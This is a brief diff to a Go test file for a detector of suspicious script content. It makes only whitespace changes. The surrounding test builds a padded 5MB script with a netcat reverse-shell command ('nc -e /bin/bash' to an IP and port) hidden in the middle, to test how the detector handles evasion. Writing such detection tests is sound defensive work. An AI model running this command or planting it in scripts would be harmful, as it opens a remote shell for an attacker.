@@ -714,7 +714,7 @@ func TestCheckSuspiciousScriptContent_MiddleOfFileEvasion(t *testing.T) {
 	// Construct a 5MB script with reverse shell planted at offset 2.5MB (dead center)
 	headPadding := bytes.Repeat([]byte("# benign system administration shell configuration parameter\n"), 40000) // ~2.4MB
 	payload := []byte("nc -e /bin/bash 192.168.1.100 4444\n")
-	tailPadding := bytes.Repeat([]byte("# trailing benign application parameters and comments\n"), 45000)      // ~2.5MB
+	tailPadding := bytes.Repeat([]byte("# trailing benign application parameters and comments\n"), 45000) // ~2.5MB
 
 	fullData := make([]byte, 0, len(headPadding)+len(payload)+len(tailPadding))
 	fullData = append(fullData, headPadding...)
@@ -971,4 +971,3 @@ func TestCheckAllSuspiciousScriptContent_ConfigAndLocalContextGating(t *testing.
 		}
 	}
 }
-
